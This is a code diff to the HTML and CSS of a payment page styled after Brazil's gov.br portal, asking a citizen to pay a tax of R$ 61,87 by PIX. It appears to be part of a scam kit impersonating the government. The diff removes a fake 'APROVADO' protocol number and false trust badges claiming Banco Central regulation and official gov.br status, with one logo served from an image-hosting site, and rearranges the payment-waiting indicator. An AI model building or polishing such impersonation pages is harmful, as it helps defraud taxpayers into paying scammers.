@@ -197,6 +197,9 @@ document.head.appendChild(a);
   .pix-copy-btn:hover { filter: brightness(.92); transform: translateY(-1px); }
   .pix-copy-btn.ok { background: linear-gradient(135deg, #0d6f18, #0a5a14); }
 
+  /* aguardando simples — sem fundo */
+  .pix-aguardando-simples { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: var(--gov-blue-primary); margin-bottom: 16px; }
+
   /* passos */
   .pix-steps { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 14px; margin-bottom: 14px; background: var(--gov-gray-light); }
   .pix-steps-title { font-size: 13px; font-weight: 700; color: #343a40; margin-bottom: 10px; }
@@ -322,18 +325,6 @@ document.head.appendChild(a);
     <!-- Conteúdo principal -->
     <div id="pix-main" style="display:none;">
 
-      <!-- Protocolo -->
-      <div class="pix-header">
-        <div class="pix-header-left">
-          <div class="pix-proto-icon"><i class="fas fa-shield-alt"></i></div>
-          <div>
-            <div class="pix-proto-label">Nº do Protocolo</div>
-            <div class="pix-proto-num" id="pix-proto-num">2025.000000.0000</div>
-          </div>
-        </div>
-        <div class="pix-badge">APROVADO</div>
-      </div>
-
       <!-- Dados do cidadão + valor -->
       <div class="pix-cidadao">
         <div class="pix-cidadao-info">
@@ -344,12 +335,6 @@ document.head.appendChild(a);
           <div class="vlabel">Valor do imposto</div>
           <div class="vnum" id="pix-valor-topo">R$ 61,87</div>
         </div>
-      </div>
-
-      <!-- Status aguardando -->
-      <div class="pix-status-bar">
-        <div class="pix-spin"></div>
-        Aguardando confirmação do pagamento
       </div>
 
       <div class="pix-body">
@@ -364,6 +349,10 @@ document.head.appendChild(a);
           <button class="pix-copy-btn" id="pix-copy-btn" onclick="pixCopiar()">
             <i class="fas fa-copy"></i><span>COPIAR CÓDIGO PIX</span>
           </button>
+          <div class="pix-aguardando-simples">
+            <div class="pix-spin"></div>
+            Aguardando confirmação do pagamento
+          </div>
           <div class="pix-steps">
             <div class="pix-steps-title">📋 Como pagar com Pix Copia e Cola:</div>
             <div class="pix-step"><div class="pix-snum">1</div><div>Clique em <b>"Copiar código PIX"</b> acima.</div></div>
@@ -388,36 +377,6 @@ document.head.appendChild(a);
               <div class="pix-step"><div class="pix-snum">1</div><div>Abra o aplicativo do seu banco.</div></div>
               <div class="pix-step"><div class="pix-snum">2</div><div>Escolha a opção <b>PIX → QR Code</b>.</div></div>
               <div class="pix-step"><div class="pix-snum">3</div><div>Escaneie o código e confirme o valor.</div></div>
-            </div>
-          </div>
-        </div>
-
-        <div class="pix-verif">
-          <div class="pix-verif-txt"><div class="pix-spin"></div> Verificando pagamento... aguarde</div>
-        </div>
-
-        <div class="pix-seg">
-          <div class="pix-seg-title">🔒 Ambiente 100% Seguro e Regulamentado</div>
-          <div class="pix-seg-grid">
-            <div class="pix-seg-item">
-              <img src="https://img.freepik.com/vetores-premium/logotipo-de-criptografia-ssl-segura-ilustracao-vetorial-de-icone-de-conexao-segura-icone-de-certificado-ssl_526569-864.jpg" class="pix-seg-logo" alt="SSL" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic g" style="display:none"><i class="fas fa-shield-alt"></i></div>
-              <div class="pix-seg-lbl"><strong>SSL 256-bit</strong><span>Conexão segura</span></div>
-            </div>
-            <div class="pix-seg-item">
-              <img src="https://assets.infra.grancursosonline.com.br/projeto/bacen.png" class="pix-seg-logo" alt="Bacen" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic b" style="display:none"><i class="fas fa-university"></i></div>
-              <div class="pix-seg-lbl"><strong>Banco Central</strong><span>Regulamentado</span></div>
-            </div>
-            <div class="pix-seg-item">
-              <img src="https://img.icons8.com/color/512/pix.png" class="pix-seg-logo" alt="PIX" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic o" style="display:none"><i class="fas fa-bolt"></i></div>
-              <div class="pix-seg-lbl"><strong>PIX Oficial</strong><span>Bacen certificado</span></div>
-            </div>
-            <div class="pix-seg-item">
-              <img src="https://i.postimg.cc/htg0g3Hz/Design-sem-nome-(12).png" class="pix-seg-logo" alt="gov.br" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic t" style="display:none"><i class="fas fa-globe"></i></div>
-              <div class="pix-seg-lbl"><strong>gov.br</strong><span>Portal oficial</span></div>
-            </div>
-            <div class="pix-seg-item pix-seg-center">
-              <img src="https://www.gov.br/funasa/pt-br/acesso-a-informacao/lei-geral-de-protecao-de-dados-pessoais-lgpd/imagem1-lgpd.png" class="pix-seg-logo" alt="LGPD" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic p" style="display:none"><i class="fas fa-lock"></i></div>
-              <div class="pix-seg-lbl"><strong>LGPD</strong><span>Dados protegidos</span></div>
             </div>
           </div>
         </div>
